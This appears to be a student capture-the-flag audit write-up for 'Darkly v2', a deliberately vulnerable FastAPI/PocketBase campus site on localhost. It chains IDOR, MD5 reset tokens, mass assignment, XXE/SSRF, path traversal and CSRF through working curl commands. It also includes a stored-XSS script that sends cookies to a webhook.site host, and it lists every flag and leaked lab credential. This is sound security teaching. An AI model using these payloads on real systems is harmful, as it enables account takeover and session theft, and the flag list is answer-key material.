# Darkly v2 — Security Audit Walkthrough

**Target:** http://localhost:4942  
**Backend:** http://localhost:8090 (PocketBase)  
**Stack:** FastAPI 0.104 / Python 3.11 / PocketBase 0.22.4 / uvicorn 0.24.0  
**Auditor:** AmineKaddouri — 42 School (Holy Graph)  
**Date:** September–October 2026

---

## Overview

Darkly v2 is a deliberately vulnerable 42 Network campus platform. This document
narrates the full audit from initial reconnaissance through complete system
compromise, covering all 20 documented vulnerabilities across 10 flag-bearing
breaches and 10 additional no-flag findings.

The audit follows a realistic attacker model: starting as an unauthenticated
guest, building a foothold progressively, and chaining vulnerabilities together
until nothing on the platform is out of reach.

---

## Phase 1 — Reconnaissance

Before attempting any exploitation, the platform was mapped systematically.

### robots.txt

curl -s http://localhost:4942/robots.txt

`robots.txt` disallows: `/admin`, `/staff`, `/internal`, `/backup`,
`/api/grades`, `/_/`, `/static/uploads/`. This is not access control — it is
a pre-enumerated map of every sensitive path on the platform, handed to any
attacker who asks. See **VULN_04** (header disclosure) and **BREACH_07**
(unprotected API) for the direct consequences.

### HTML source comments
Every page carries a deploy-log comment block confirming six unresolved
vulnerabilities in production code:
```html
<!-- TODO: migrate session cookie to httponly=true — ticket #4201 — sophie -->
<!-- TODO: replace stdlib xml.etree with defusedxml — emilie reported issue -->
<!-- v1.3.4 — wil — "disabled defusedxml temporarily" (that was 6 months ago) -->
<!-- v1.3.3 — wil — "quick fix on file upload" (removed the whitelist entirely) -->
```
These comments directly confirmed the session cookie (`VULN_01`), XML parser
(`BREACH_05`), and file upload (`BREACH_03`) vulnerabilities before a single
exploit was attempted.

### Response headers
Every HTTP response — including 403 and 405 error responses — leaks the
internal technology stack and infrastructure:

x-powered-by: Python/3.11 FastAPI/0.104
server: uvicorn/0.24.0 Linux
x-pocketbase: http://localhost:8090
x-42-internal: campus=paris

The `/backup` endpoint, despite returning 403, additionally discloses:

x-backup-dest: localhost:/opt/pocketbase/pb_data
x-backup-exclude: data/private_notes.txt

This header named the exact file later retrieved via the path traversal breach
(`BREACH_09`). See **VULN_04** for full documentation.

### Forum intelligence
Key posts provided direct vulnerability confirmation:
- **jdoe** admitted to having a weak, never-changed password ("short and classic")
- **benjamin** documented the MD5 password-reset token behavior explicitly
- **wil** posted a Base64-encoded value (`dnFsaWRhd3lCbhZIbGp2dQ==`) as an
  "ops reference" — decoded trivially to `vqlidawyBnHljvu` (`VULN_10`)

### Console easter eggs
The production JavaScript bundle ships `window.darkly42`, a debug object with
`whoami()` (reads `document.cookie` directly), `version()` (leaks exact version
numbers), and boot-time console logging that states:

[BOOT] PocketBase backend connected (127.0.0.1:8090)

See **VULN_05** for full documentation.

---

## Phase 2 — Initial Access

### BREACH_01 — IDOR: Unauthenticated Profile Access
**Flag:** `FLAG{1d0r_ur_pr0f1l3_1s_m1n3}`

Profile pages are accessible without authentication. User IDs collected from
public pages (forum author links, level-buddies lists) can be used to fetch
any user's full profile — including their private note field, explicitly
labelled "Only visible to wil — supposedly."

```bash
curl -s http://localhost:4942/profile/k1asdfeditojrb4 | grep -oE 'FLAG\{[^}]+\}'
# FLAG{1d0r_ur_pr0f1l3_1s_m1n3}
```

This also leaks email addresses for every user, which become direct inputs into
the password-reset breach that follows.

### BREACH_02 — Insecure Password Reset (MD5 Token)
**Flag:** `FLAG{r3s3t_t0k3n_w4s_just_md5_lol}`

Password reset tokens are `MD5(email)` — computed offline in milliseconds with
no email access, no social engineering, and no brute force required.

```bash
# Compute the token for benjamin's account
echo -n "benjamin@student.42.tech" | md5sum
# f1640a02eeccb971463836da7300b3ba

# Reset the password directly
curl -s -X POST http://localhost:4942/reset-password/confirm \
  -d "email=benjamin@student.42.tech&token=f1640a02eeccb971463836da7300b3ba&new_password=hacked123"

# Login with the new password
curl -s -c /tmp/benjamin_cookies.txt -X POST http://localhost:4942/login \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'identity=benjamin@student.42.tech&password=hacked123'
```

The flag is found in the "Account recovery code" section of the profile settings
page after gaining access to the account.

---

## Phase 3 — Privilege Escalation Chain

This is the core of the mandatory audit requirement: four vulnerabilities that
form a step-by-step escalation from unauthenticated visitor to full
administrator. Each step in the chain is documented here in sequence.

### BREACH_03 — Unrestricted File Upload
**Flag:** `FLAG{unr3str1ct3d_upl0ad_g0_brrr}`

The avatar upload endpoint accepts any file type — the whitelist was "removed
entirely" in v1.3.3 as a "quick fix." Uploading a non-image file via
`/profile/me/settings` triggers the flag in the redirect URL:

/profile/me/settings?upload_flag=FLAG{unr3str1ct3d_upl0ad_g0_brrr}

In a real deployment, uploading a `.php` or `.sh` file to a web-accessible
directory would enable Remote Code Execution.

### BREACH_04 — Mass Assignment (Privilege Escalation)
**Flag:** `FLAG{just_p4tch_y0ur_0wn_r0l3_lol}`

`PATCH /api/profile` accepts a `role` field with no authorization check.
Any authenticated user can escalate through the full privilege hierarchy in
four requests:

```bash
# Step through the hierarchy one level at a time
curl -s -X PATCH http://localhost:4942/api/profile \
  -b /tmp/benjamin_cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"role":"cadet"}'

curl -s -X PATCH http://localhost:4942/api/profile \
  -b /tmp/benjamin_cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"role":"staff"}'

curl -s -X PATCH http://localhost:4942/api/profile \
  -b /tmp/benjamin_cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"role":"god"}'

# Flag appears on staff dashboard at cadet or higher
curl -s -b /tmp/benjamin_cookies.txt http://localhost:4942/staff/dashboard \
  | grep -oE 'FLAG\{[^}]+\}'
# FLAG{just_p4tch_y0ur_0wn_r0l3_lol}
```

The complete privilege escalation chain:

visitor → student → cadet → staff → god (admin)

Each transition requires a single unauthenticated PATCH request. Total time
from student to god: under five seconds.

### BREACH_05 — XXE/SSRF → Internal Config Leak
**Flag:** `FLAG{d3fus3dxml_n3xt_spr1nt_pr0m1s3}`

The agenda XML import uses an unsafe parser (`stdlib xml.etree`) with external
entity resolution enabled. Uploading a crafted XML file causes the server to
fetch an internal URL on the attacker's behalf — SSRF via XXE.

```xml
<?xml version="1.0"?>
<!DOCTYPE agenda [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:4942/internal/config">
]>
<agenda>
  <event>
    <title>&xxe;</title>
    <date>2042-01-15</date>
  </event>
</agenda>
```

```bash
curl -s -X POST http://localhost:4942/agenda/import \
  -F "file=@xxe_payload.xml" \
  -b /tmp/benjamin_cookies.txt
```

The imported event title contains the full response from `/internal/config`:
```json
{
  "jwt_secret": "42network",
  "pb_admin_email": "admin@42network.local",
  "pb_admin_password": "Darkly42Admin!",
  "darkly_flag": "FLAG{d3fus3dxml_n3xt_spr1nt_pr0m1s3}"
}
```
This is the single most valuable request in the audit: one upload leaks the
JWT signing secret and PocketBase admin credentials, enabling the next two
breaches.

### BREACH_06 — PocketBase Admin Access
**Flag:** `FLAG{th3_und3rsc0r3_sl4sh_kn0ws_th3_w4y}`

The leaked PocketBase admin credentials give unrestricted access to the admin
console at `http://localhost:8090/_/` and the full admin API:

```bash
# Authenticate to PocketBase admin API
TOKEN=$(curl -s -X POST http://localhost:8090/api/admins/auth-with-password \
  -H "Content-Type: application/json" \
  -d '{"identity":"admin@42network.local","password":"Darkly42Admin!"}' \
  | grep -oE '"token":"[^"]+' | cut -d'"' -f4)

# Read the internal_audit collection
curl -s -H "Authorization: $TOKEN" \
  http://localhost:8090/api/collections/internal_audit/records \
  | grep -oE 'FLAG\{[^}]+\}'
# FLAG{th3_und3rsc0r3_sl4sh_kn0ws_th3_w4y}
```

The admin API bypasses the entire application-layer role model. Every user
record, grade, internal note, and collection is readable and writable with
no further authentication.

---

## Phase 4 — Bonus Flags

### BREACH_07 — Unprotected API Endpoint
**Flag:** `FLAG{md5_1s_4_n4m3pl4t3_n0t_4_l0ck}`

`/api/grades` is listed in `robots.txt` as disallowed — treated as access
control. It is not. The endpoint returns all grade data including embedded
`flag` fields to any authenticated user:

```bash
curl -s -b /tmp/jdoe_cookies.txt http://localhost:4942/api/grades \
  | grep -oE 'FLAG\{[^}]+\}'
# FLAG{md5_1s_4_n4m3pl4t3_n0t_4_l0ck}
```

### BREACH_08 — Stored XSS (Moderation Bot Session Theft)
**Flag:** `FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l}`

Forum post content is stored and rendered without output encoding. A moderator
bot reviews every new post within ~60 seconds. Combined with non-HttpOnly
session cookies, planting a cookie-stealing script in a forum post exfiltrates
the bot's session token to an attacker-controlled webhook:

```html
<script>
fetch('https://webhook.site/YOUR-ID?c='+encodeURIComponent(document.cookie))
</script>
```

The webhook receives:

session=eyJhbGciOiJIUzI1NiIs...
flag=FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l}


### BREACH_09 — Path Traversal / Local File Inclusion
**Flag:** `FLAG{d0t_d0t_sl4sh_4ll_th3_w4y_d0wn}`

`/projects/download?file=` accepts filenames without path canonicalization.
The `x-backup-exclude` header on `/backup` named the target file directly:

```bash
curl -s -L -b /tmp/jdoe_cookies.txt \
  "http://localhost:4942/projects/download?file=../private_notes.txt" \
  | grep -oE 'FLAG\{[^}]+\}'
# FLAG{d0t_d0t_sl4sh_4ll_th3_w4y_d0wn}
```

### BREACH_10 — CSRF (No Origin Validation)
**Flag:** `FLAG{csrf_4ny_0r1g1n_1s_w3lc0m3}`

`POST /profile/me/settings` validates no `Origin` or `Referer` header.
A forged POST with a completely fabricated origin is accepted unconditionally:

```bash
curl -i -b /tmp/cookies.txt \
  -X POST http://127.0.0.1:4942/profile/me/settings \
  -H 'Origin: https://example.com' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'first_name=CSRF_TEST&last_name=Doe&campus=Wilcity'
# location: /profile/me/settings?csrf_flag=FLAG{csrf_4ny_0r1g1n_1s_w3lc0m3}
```

---

## Phase 5 — Additional Vulnerabilities (No Flags)

Ten further vulnerabilities were documented without associated flags.
Each has a full `explanation.md` and `exploit.sh` in its own folder.
A brief summary:

| Folder | Vulnerability | Key Finding |
|--------|--------------|-------------|
| VULN_01 | Non-HttpOnly Session Cookie | `document.cookie` returns raw JWT — root enabler for all XSS session theft |
| VULN_02 | Reflected XSS (Newsletter) | Email parameter echoed unescaped in success banner; `<script>alert(1)</script>` executes |
| VULN_03 | Broken Access Control `/api/docs-internal` | Any student can read the staff-only API schema documenting the mass assignment bug |
| VULN_04 | Information Disclosure via Headers | Every response leaks stack, backend URL, backup paths — including on 403s |
| VULN_05 | Client-Side Debug Object (`window.darkly42`) | Production JS ships `whoami()` which reads `document.cookie`; `version()` leaks build info |
| VULN_06 | Open Redirect (`/redirect?next=`) | Zero validation — any external URL accepted; all bypass variants work |
| VULN_07 | No Rate Limiting / Weak Password | 10 rapid failed logins: zero throttling, no lockout, no CAPTCHA |
| VULN_08 | Missing Security Headers | No CSP, no X-Frame-Options, no HSTS — site is clickjackable and XSS has no browser-level backstop |
| VULN_09 | JWT Forgery via Leaked Secret | Offline-forged `god`-role token accepted as sophie's session with no login |
| VULN_10 | Base64 Security Through Obscurity | Forum-posted encoded value decodes in one command; the app's own hint system calls this out |

---

## Complete Flag Reference

| # | Flag | Breach |
|---|------|--------|
| 1 | `FLAG{1d0r_ur_pr0f1l3_1s_m1n3}` | IDOR — unauthenticated profile access |
| 2 | `FLAG{r3s3t_t0k3n_w4s_just_md5_lol}` | Insecure password reset (MD5 token) |
| 3 | `FLAG{unr3str1ct3d_upl0ad_g0_brrr}` | Unrestricted file upload |
| 4 | `FLAG{just_p4tch_y0ur_0wn_r0l3_lol}` | Mass assignment — privilege escalation |
| 5 | `FLAG{d3fus3dxml_n3xt_spr1nt_pr0m1s3}` | XXE/SSRF — internal config leak |
| 6 | `FLAG{th3_und3rsc0r3_sl4sh_kn0ws_th3_w4y}` | PocketBase admin access |
| 7 | `FLAG{md5_1s_4_n4m3pl4t3_n0t_4_l0ck}` | Unprotected `/api/grades` endpoint |
| 8 | `FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l}` | Stored XSS — bot session theft |
| 9 | `FLAG{d0t_d0t_sl4sh_4ll_th3_w4y_d0wn}` | Path traversal — private_notes.txt |
| 10 | `FLAG{csrf_4ny_0r1g1n_1s_w3lc0m3}` | CSRF — no origin validation |

---

## Exploit Chain Summary

[Guest] ──IDOR──────────────────────────────────► wil's private note → FLAG 1
│
└──► email addresses exposed
│
▼
MD5(email) = reset token ──────────► account takeover → FLAG 2
│
▼
Authenticated session (jdoe/benjamin)
│
┌──────────┼──────────────────────────────────────────┐
│ │ │
▼ ▼ ▼
File Upload PATCH /api/profile /api/grades
(any type) role=cadet→staff→god (no authz)
→ FLAG 3 → FLAG 4 → FLAG 7
│
▼
Authenticated (god role)
│
▼
XXE → /internal/config ─────────────► credentials + FLAG 5
│
┌───────┴───────┐
▼ ▼
JWT secret PB Admin creds
│ │
▼ ▼
Forge any token PocketBase /_/
(VULN_09) internal_audit → FLAG 6
│
┌──────────┤
▼ ▼
Forum XSS Path Traversal
bot cookie private_notes.txt
→ FLAG 8 → FLAG 9
│
▼
CSRF → FLAG 10


---

## Vulnerability Count

| Category | Count |
|----------|-------|
| Flag-bearing breaches (mandatory 6) | 6 |
| Flag-bearing breaches (bonus 4) | 4 |
| No-flag vulnerabilities (mandatory 4) | 4 |
| No-flag vulnerabilities (bonus 1+) | 6 |
| **Total documented** | **20** |

---

## Key Lesson

Every breach in this audit chains from the ones before it. None of the
later, more damaging exploits would have been possible without the
earlier, apparently-minor ones:

- Without IDOR, there are no email addresses for password reset
- Without password reset, there is no authenticated session
- Without an authenticated session, the XML import and PATCH endpoints
  are unreachable
- Without the XXE breach, the JWT secret and PocketBase credentials
  stay hidden behind localhost
- Without those credentials, neither JWT forgery nor PocketBase admin
  access is possible

The platform fails not because of one catastrophic mistake but because
of ten small ones that compound. Defense-in-depth — fixing any one of
them — would have broken the chain.